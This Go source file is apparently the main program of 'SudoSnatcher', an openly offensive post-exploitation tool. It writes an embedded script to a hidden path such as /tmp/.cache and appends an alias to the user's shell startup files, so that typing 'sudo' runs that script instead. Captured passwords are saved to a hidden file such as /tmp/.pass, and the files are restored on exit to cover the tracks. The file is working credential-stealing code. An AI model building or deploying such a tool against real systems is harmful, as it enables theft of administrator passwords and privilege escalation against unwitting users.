package main

import (
	"bufio"
	_ "embed"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

//go:embed scripts/sudo.sh
var sudoScript string

func banner() {
	fmt.Println("____ _  _ ___  ____ ____ _  _ ____ ___ ____ _  _ ____ ____ \n[__  |  | |  \\ |  | [__  |\\ | |__|  |  |    |__| |___ |__/ \n___] |__| |__/ |__| ___] | \\| |  |  |  |___ |  | |___ |  \\ \n                                                           ")
	fmt.Println("https://github.com/testzboy/SudoSnatcher")
}

func fileExists(filename string) bool {
	info, err := os.Stat(filename)
	return err == nil && !info.IsDir()
}

func fileContains(filename, text string) bool {
	file, err := os.Open(filename)
	if err != nil {
		return false
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		if strings.Contains(scanner.Text(), text) {
			return true
		}
	}
	return false
}

func writeToFile(filename, content string) error {
	file, err := os.OpenFile(filename, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.WriteString(content)
	return err
}

func backupFile(filename string) error {
	input, err := os.ReadFile(filename)
	if err != nil {
		return err
	}
	return os.WriteFile(filename+".bak", input, 0644)
}

func restoreFile(filename string) error {
	input, err := os.ReadFile(filename + ".bak")
	if err != nil {
		return err
	}
	return os.WriteFile(filename, input, 0644)
}

func deleteBackup(filename string) error {
	return os.Remove(filename + ".bak")
}

func addAlias(filename, alias string) error {
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.WriteString(fmt.Sprintf("\n%s\n", alias))
	return err
}

func sourceFile(filename string) error {
	cmd := exec.Command("bash", "-c", "source "+filename)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

func makeExecutable(filepath string) error {
	return os.Chmod(filepath, 0755)
}

func main() {
	aliasPath := flag.String("i", "/tmp/.cache", "Path to the script for the alias")
	outputPath := flag.String("o", "/tmp/.pass", "Output file path for saved passwords")
	flag.Parse()
	banner()
	fmt.Println("\n==== PASS  ====")
	fmt.Println(">> Passwords Path:", *outputPath)
	fmt.Println("\n==== START ====")
	// Replace save_location in the script with the provided outputPath
	modifiedScript := strings.Replace(sudoScript, "/opt/.pass", *outputPath, -1)

	err := writeToFile(*aliasPath, modifiedScript)
	if err != nil {
		fmt.Println("Error writing to aliasPath:", err)
		return
	} else {
		fmt.Println("Successfully created aliasPath:", *aliasPath)
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		fmt.Println("Error getting user home directory:", err)
		return
	}

	files := []string{
		homeDir + "/.bash_profile",
		homeDir + "/.bash_login",
		homeDir + "/.profile",
		homeDir + "/.bashrc",
	}

	alias := fmt.Sprintf("alias sudo='%s'", *aliasPath)
	var filesToSource []string

	for _, file := range files {
		if fileExists(file) {
			err = backupFile(file)
			if err != nil {
				fmt.Println("Error backing up", file, ":", err)
			}

			if !fileContains(file, alias) {
				err := addAlias(file, alias)
				if err != nil {
					fmt.Println("Error writing to", file, ":", err)
				} else {
					fmt.Println("Alias added to", file)
					filesToSource = append(filesToSource, file)
				}
			}
		}
	}

	if !fileExists(*aliasPath) {
		fmt.Println("File does not exist:", *aliasPath)
		return
	}

	err = makeExecutable(*aliasPath)
	if err != nil {
		fmt.Println("Error making file executable:", err)
		return
	}

	for _, file := range filesToSource {
		err := sourceFile(file)
		if err != nil {
			fmt.Println("Error sourcing", file, ":", err)
		} else {
			fmt.Println(file, "sourced successfully.")
		}
	}

	reader := bufio.NewReader(os.Stdin)
	fmt.Println("Serving Listening: Type 'quit' to exit, restore backups ...")
	for {
		fmt.Print("> ")
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		if input == "quit" {
			fmt.Println("\n==== QUIT  ====")
			for _, file := range filesToSource {
				err := restoreFile(file)
				if err != nil {
					fmt.Println("Error restoring", file, ":", err)
				} else {
					fmt.Println(file, "restored successfully.")
					err = sourceFile(file)
					if err != nil {
						fmt.Println("Error sourcing restored", file, ":", err)
					} else {
						fmt.Println(file, "restored and sourced successfully.")
					}
					err = deleteBackup(file)
					if err != nil {
						fmt.Println("Error deleting backup for", file, ":", err)
					} else {
						fmt.Println("Backup for", file, "deleted successfully.")
					}
				}
			}

			// Delete the aliasPath file
			err = os.Remove(*aliasPath)
			if err != nil {
				fmt.Println("Error deleting aliasPath:", err)
			} else {
				fmt.Println("aliasPath deleted successfully.")
			}

			break
		}
	}
}
